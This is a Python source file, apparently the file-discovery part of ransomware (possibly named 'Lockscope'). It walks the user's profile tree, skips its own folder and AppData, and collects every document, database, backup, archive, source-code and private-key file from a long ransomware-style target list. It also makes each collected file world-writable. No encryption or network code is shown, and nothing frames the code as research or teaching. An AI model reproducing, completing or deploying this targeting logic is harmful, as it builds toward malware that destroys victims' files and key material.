import os
import stat 

def find_files(path):
    file_format = {'.DOC': 0, '.DOCX': 0, '.DOCM': 0, '.DOCB': 0, '.DOT': 0, 'DOTM': 0, '.DOTX': 0, '.XLS': 0, '.XLSX': 0, '.XLSM': 0, '.XLSB': 0,
                    '.XLW': 0, '.XLT': 0, '.XLC': 0, '.XLTX': 0, '.XLTM': 0, '.XLAM': 0, '.PPT': 0, '.PPTM': 0, '.PPTX': 0, '.POT': 0, '.POTM': 0,
                    '.POTX': 0, '.PPS': 0, '.PPSM': 0, '.PPTX': 0, '.PPAM': 0, '.SLDX': 0, '.SLDM': 0, '.PST': 0, '.OST': 0, '.MSG': 0, '.EML': 0, 
                    '.VSD': 0, '.VSDX': 0, '.TXT': 0, '.CSV': 0, '.XML': 0, '.JSON': 0, '.RTF': 0, '.WKS': 0, '.WK1': 0, '.PDF': 0, '.DWG': 0, 
                    '.ONE': 0, '.ONETOC2': 0, '.SNT': 0, '.SXI': 0, '.STI': 0, '.SVG': 0, '.OTG': 0, '.ODG': 0, '.STD': 0, '.OTP': 0, '.ODP': 0,
                    '.DIF': 0, '.ODS': 0, '.MAX': 0, '.3DM': 0, '.UOF': 0, '.STW': 0, '.SXW': 0, '.JPEG': 0, '.JPG': 0, '.JFIF': 0, 
                    '.PNG': 0, '.WEBP': 0, '.GIF': 0, '.TIF': 0, '.TIFF': 0, '.BMP': 0, '.PSD': 0, '.AI': 0, '.RAW': 0, '.CGM': 0, '.NEF': 0, '.DJVU': 0,
                    '.M4U': 0, '.M3U': 0, '.FLV': 0, '.3G2': 0, '.MKV': 0, '.3GP': 0, '.MP4': 0, '.MOV': 0, '.ASF': 0, '.MPEG': 0, '.MPG': 0, '.WMV': 0, 
                    '.SWF': 0, '.MID': 0, '.WMA': 0, '.WAV': 0, '.MP3': 0, '.VDI': 0, '.VMDK': 0, '.VMX': 0, '.TBK': 0, '.YML': 0, '.YAML':0, '.ARC': 0, 
                    '.BZ2': 0, '.TAR': 0, '.TGZ': 0, '.GZ': 0, '.7Z': 0, '.RAR': 0, '.ZIP': 0, '.EDB': 0, '.LDF': 0, '.IBD': 0, '.MYI': 0, '.MYD': 0, '.FRM': 0, 
                    '.ODB': 0, '.DBF': 0, '.DB': 0, '.MDB': 0, '.ACCDB': 0, '.SQL': 0, '.SQLITEDB': 0, '.SQLITE3': 0, '.PAQ': 0, '.BAK': 0, '.BACKUP': 0, 
                    '.ISO': 0, '.VCD': 0, '.SH': 0, '.CLASS': 0, '.JAR': 0, '.JAVA': 0, '.RB': 0, '.ASP': 0, '.PHP': 0, '.JSP': 0, '.PL': 0, '.VB': 0, 
                    '.VBS': 0, '.PS1': 0, '.BAT': 0, '.CMD': 0, '.JS': 0, '.ASM': 0, '.H': 0, '.CPP': 0, '.C': 0, '.CS': 0, '.SUO': 0, '.SLN': 0,
                    '.GPG': 0, '.AES': 0, '.PEM': 0, '.P12': 0, '.CSR': 0, '.CRT': 0, '.KEY': 0, '.PFX': 0, '.DER': 0
                    }
    
    f = []
    
    folders_excluded = {".vscode", "AppData", "Lockscope"}

    for root, directory, files in os.walk(path):
        directory[:] = [d for d in directory if d not in folders_excluded]
        for file in files:
            try:
                extension = os.path.splitext(os.path.join(root, file))[1].upper()
                if(file_format.get(extension) == 0 or extension == ''):
                    total_path = os.path.join(root, file)
                    os.chmod(total_path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
                    f.append(total_path)
            except PermissionError:
                print("Error")
     
    return f       
            
def username():
    username_path = os.environ['USERPROFILE']
    
    return username_path
